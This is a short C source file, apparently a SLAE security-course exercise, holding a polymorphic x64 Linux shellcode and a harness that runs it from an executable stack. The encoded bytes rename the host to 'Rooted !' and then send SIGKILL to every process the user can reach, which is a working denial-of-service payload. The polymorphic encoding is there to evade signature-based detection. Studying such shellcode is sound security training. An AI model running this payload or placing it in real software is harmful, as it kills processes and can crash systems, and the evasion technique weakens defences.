/*
Filename:      shellcode-polymorphic.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  03.02.2019
Note:          x64
Compiler:      gcc -ggdb -fno-stack-protector -z execstack shellcode-polymorphic.c -o shellcode-polymorphic
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\x48\x31\xc0\x48\x31\xf6\xb0\x99\x49\xb9\x51"
"\x6e\x6e\x73\x65\x64\x20\x21\x49\x81\xc1\x01"
"\x01\x01\x01\x41\x51\x48\x89\xe7\x40\xb6\x08"
"\x04\x11\x0f\x05\x6a\x3d\x58\x6a\xff\x5f\x6a"
"\x09\x5e\x48\xff\xc0\x0f\x05";

main()
{
  printf("Shellcode Lenght: %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
